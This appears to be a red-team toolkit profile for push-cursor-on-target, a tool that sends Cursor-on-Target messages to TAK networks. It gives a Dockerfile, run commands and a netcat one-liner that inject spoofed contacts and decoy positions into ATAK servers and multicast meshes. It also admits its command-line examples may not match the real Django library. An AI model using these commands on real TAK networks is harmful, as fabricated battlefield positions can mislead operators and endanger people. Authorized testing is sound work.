# push-cursor-on-target

> **RISK CLASSIFICATION**: HIGH RISK - SENSITIVE SOFTWARE
> This tool is part of a controlled military/defense training toolkit. push-cursor-on-target can inject false position location information (PLI) and fabricated CoT events directly into TAK networks, causing ATAK/WinTAK/iTAK clients to display spoofed contacts, false positions, and fake alerts. This capability constitutes electronic deception and is restricted to authorized red-team operations, penetration testing, and controlled training environments only. Unauthorized use against operational TAK networks may violate federal law.

## Deployment Classification

> **RUNS ON ARGOS RPi 5: YES** — Python/Shell scripts, fully architecture-independent

| Method               | Supported | Notes                                                                 |
| -------------------- | --------- | --------------------------------------------------------------------- |
| **Docker Container** | YES       | Minimal Python image; `--network host` for UDP multicast to ATAK mesh |
| **Native Install**   | YES       | Clone from GitHub + `pip install lxml`; trivial resource usage        |

---

## Tool Description

push-cursor-on-target is a standalone command-line tool for sending Cursor-on-Target (CoT) messages to ATAK devices and TAK servers via UDP and TCP. It can push both real and fabricated position location information (PLI), emergency alerts, sensor points of interest, and arbitrary CoT event types to any TAK-compatible endpoint. The tool supports direct device-to-device communication via UDP multicast (ATAK mesh mode) and server-mediated delivery via TCP connections. Originally developed by SOFWERX (U.S. Special Operations Command technology accelerator) for rapid prototyping and testing of TAK integrations. For Argos red-team operations, this tool enables injection of false contacts, decoy positions, and phantom signals into adversary TAK networks to test blue-force tracking resilience.

## Category

TAK Protocol / CoT Injection / Red Team / Electronic Deception

## Repository

- **Source**: https://github.com/sofwerx/push-cursor-on-target
- **Language**: Python / Shell
- **License**: Unlicensed / Public Domain (SOFWERX government-sponsored)

> **Note**: This project is structured as a Django library/app, not a standalone CLI tool. The main file is `CoT.py` and it is designed to be imported and used within a Django project, not called directly from the command line. The examples below show usage patterns but may require a Django environment to function fully.

---

## Docker Compatibility

### Can it run in Docker?

YES

### Docker Requirements

- Base Python 3.x image (ARM64-compatible)
- Network access to target TAK endpoints (UDP/TCP)
- Host network mode recommended for UDP multicast scenarios
- No special hardware or device access required
- Minimal image footprint

### Dockerfile

```dockerfile
FROM python:3.11-slim-bookworm

LABEL maintainer="Argos Project"
LABEL description="push-cursor-on-target - CoT message sender for TAK networks"
LABEL risk="HIGH - SENSITIVE SOFTWARE"

RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        git \
        netcat-openbsd && \
    rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/sofwerx/push-cursor-on-target.git /opt/push-cot

WORKDIR /opt/push-cot

RUN pip install --no-cache-dir -r requirements.txt 2>/dev/null || \
    pip install --no-cache-dir lxml

# Ensure scripts are executable
RUN chmod +x *.sh *.py 2>/dev/null || true

CMD ["python", "--help"]
```

### Docker Run Command

```bash
# Push a PLI (position) to a TAK server via TCP
docker run -it --rm \
    --name argos-push-cot \
    --network host \
    argos-push-cot \
    python CoT.py \
        --host tak-server \
        --port 8087 \
        --uid "SPOOF-CONTACT-001" \
        --lat 38.8977 \
        --lon -77.0365 \
        --callsign "PHANTOM-1"

# Push via UDP multicast to ATAK mesh
docker run -it --rm \
    --name argos-push-cot \
    --network host \
    argos-push-cot \
    python CoT.py \
        --host 239.2.3.1 \
        --port 6969 \
        --protocol udp \
        --uid "DECOY-001" \
        --lat 38.9000 \
        --lon -77.0400 \
        --callsign "DECOY-UNIT"

# Run with custom CoT XML file
docker run -it --rm \
    --name argos-push-cot \
    --network host \
    -v $(pwd)/cot-messages:/opt/push-cot/messages:ro \
    argos-push-cot \
    python CoT.py --file /opt/push-cot/messages/custom_event.xml
```

---

## Install Instructions (Native)

```bash
# Clone the repository
git clone https://github.com/sofwerx/push-cursor-on-target.git
cd push-cursor-on-target

# Install dependencies
pip install lxml

# If a requirements.txt exists
pip install -r requirements.txt

# Verify the tool runs
python CoT.py --help

# Alternative: Manual CoT push with netcat (no Python needed)
# Create a CoT XML message and send via UDP
cat <<'EOF' | nc -u 239.2.3.1 6969
<?xml version='1.0' encoding='UTF-8'?>
<event version="2.0" uid="TEST-001" type="a-f-G-U-C"
       time="2025-01-01T00:00:00Z" start="2025-01-01T00:00:00Z"
       stale="2025-01-01T00:05:00Z" how="m-g">
  <point lat="38.8977" lon="-77.0365" hae="10.0" ce="5.0" le="5.0"/>
  <detail>
    <contact callsign="TEST-CONTACT"/>
  </detail>
</event>
EOF
```

---

## Kali Linux Raspberry Pi 5 Compatibility

| Criteria              | Status                                                                      |
| --------------------- | --------------------------------------------------------------------------- |
| ARM64 Support         | ✅ Python/Shell scripts, architecture-independent                           |
| Kali Repo Available   | ❌ Not in Kali repos, clone from GitHub                                     |
| Hardware Requirements | Minimal -- network interface only                                           |
| Performance on RPi5   | Excellent -- trivial resource usage for message generation and transmission |

### Platform Details

- **Tested Architecture**: aarch64 (ARM64)
- **Python Requirement**: Python 3.x
- **Key Dependencies**: lxml (available for ARM64 via pip)
- **Memory Footprint**: <20MB RAM
- **CPU Impact**: Negligible -- simple XML generation and socket send
- **Network Requirements**: UDP/TCP access to TAK server or multicast group

### Operational Security Notes

- CoT messages sent via UDP multicast are visible to all devices on the network segment
- TCP connections to TAK servers may be logged and audited
- Fabricated UIDs and callsigns should follow conventions that identify them as test/training
- Always coordinate with TAK server administrators before injection testing

### Verdict

**COMPATIBLE** -- Lightweight Python/Shell tool with minimal dependencies. Runs without modification on Raspberry Pi 5 ARM64 with Kali Linux. The tool's simplicity (XML generation + socket send) means it has effectively zero performance overhead on the RPi5 platform. Ideal for rapid CoT injection testing from a portable field device.
